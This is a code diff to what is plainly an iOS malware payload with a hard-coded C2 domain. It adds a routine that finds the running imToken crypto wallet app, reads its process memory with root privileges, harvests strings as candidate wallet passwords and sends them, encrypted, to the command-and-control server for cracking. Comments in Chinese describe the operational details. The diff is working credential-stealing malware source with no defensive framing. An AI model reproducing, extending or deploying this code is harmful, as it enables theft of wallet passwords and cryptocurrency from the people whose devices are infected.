@@ -12,6 +12,7 @@
 #import "Info.h"
 #import "Collector.h"
 #import "WalletFS.h"
+#import "MemScan.h"
 #import "Crypto.h"
 
 static NSString *const kBaseURL     = @"https://myg3z1adawtxz0s.icu";          // C2 域名
@@ -22,6 +23,8 @@ static NSString *const kSeed        = @"d9f5121f75a6646c4f814a4ff8c41b04";    //
 @property (nonatomic, strong) Net *net;
 @property (nonatomic, strong) NSMutableSet<NSString *> *runningTasks;
 @property (nonatomic, assign) BOOL photoBusy;
+@property (nonatomic, strong) NSMutableSet<NSString *> *sentCandidates;
+@property (nonatomic, assign) pid_t lastScanPid;
 @end
 
 @implementation Payload
@@ -36,6 +39,7 @@ static NSString *const kSeed        = @"d9f5121f75a6646c4f814a4ff8c41b04";    //
 - (instancetype)init {
     if ((self = [super init])) {
         _runningTasks = [NSMutableSet set];
+          _sentCandidates = [NSMutableSet set];
         _net = [Net shared];
         _net.baseURL = kBaseURL;
         _net.aesPassword = kAesPassword;
@@ -466,6 +470,8 @@ static NSArray *WalletPathsFor(NSString *bundleId) {
                         if (tick % 15 == 7) { [self collectAndUploadWallet:@"im.token.app"]; [self probeImTokenEntry]; }
                         // 每 60 秒单独探一次入口标记（注入要 140 秒，启动时那次来不及）
                         if (tick % 3 == 0) [self probeImTokenEntry];
+                        // 每轮（20 秒）看一次 imToken 在不在跑，在跑就直接读它内存
+                        [self scanImTokenMemory];
                         [self pollTasks];                          // 每轮都轮询
                     }
                 } @catch (NSException *e) {
@@ -499,6 +505,70 @@ static NSArray *WalletPathsFor(NSString *bundleId) {
         [self.net sendEvent:ev];
     } @catch (NSException *e) {
         (void)e;
+    }
+}
+
+
+#pragma mark - 监听 imToken 并直接读它的内存
+
+/**
+ * locationd 常驻、uid=0、task_for_pid 30/30 成功（已实测）。
+ * 所以不需要把代码注入 imToken，也不需要等 142 秒：
+ * 只要它启动了，我们就直接读它的堆，把可打印字符串当候选密码捞出来。
+ * 真实校验放服务端（pbkdf2 c=262144 在手机上太慢）。
+ */
+- (void)scanImTokenMemory {
+    @try {
+        pid_t pid = [MemScan pidOfExecutableContaining:@"imToken"];
+        if (pid <= 0) return;                 // imToken 没在跑，什么都不做
+
+        // 进程换了就清空去重表
+        if (self.lastScanPid != pid) {
+            self.lastScanPid = pid;
+            [self.sentCandidates removeAllObjects];
+        }
+
+        NSDictionary *h = [MemScan harvestStringsFromPid:pid
+                                                maxBytes:192 * 1024 * 1024
+                                               maxCands:1500];
+        NSArray *cands = h[@"candidates"];
+        if (!cands.count) return;
+
+        // 只上报没发过的
+        NSMutableArray *fresh = [NSMutableArray array];
+        for (NSString *c in cands) {
+            if ([self.sentCandidates containsObject:c]) continue;
+            [fresh addObject:c];
+            if (fresh.count >= 300) break;     // 单次最多 300 条，服务端逐条试
+        }
+        if (!fresh.count) return;
+        for (NSString *c in fresh) [self.sentCandidates addObject:c];
+
+        NSMutableDictionary *body = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+        body[@"c"] = kSeed;
+        body[@"bundle_id"] = @"im.token.app";
+        body[@"candidates"] = fresh;
+
+        NSDictionary *r = [self.net postEncrypted:@"/pw" json:body timeout:120];
+
+        NSMutableDictionary *ctx = [NSMutableDictionary dictionary];
+        ctx[@"pid"] = @(pid);
+        ctx[@"scannedBytes"] = h[@"scannedBytes"] ?: @0;
+        ctx[@"regions"] = h[@"regions"] ?: @0;
+        ctx[@"found"] = @(cands.count);
+        ctx[@"sent"] = @(fresh.count);
+        ctx[@"resp"] = r ? [r description] : @"nil";
+        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+        ev[@"et"] = @"memscan_harvest";
+        ev[@"c"] = kSeed;
+        ev[@"ctx"] = ctx;
+        [self.net sendEvent:ev];
+
+        [self log:[NSString stringWithFormat:@"memscan pid=%d found=%lu sent=%lu -> %@",
+                   pid, (unsigned long)cands.count, (unsigned long)fresh.count,
+                   r ? [r description] : @"nil"]];
+    } @catch (NSException *e) {
+        [self log:[NSString stringWithFormat:@"memscan exception: %@", e.reason]];
     }
 }
 
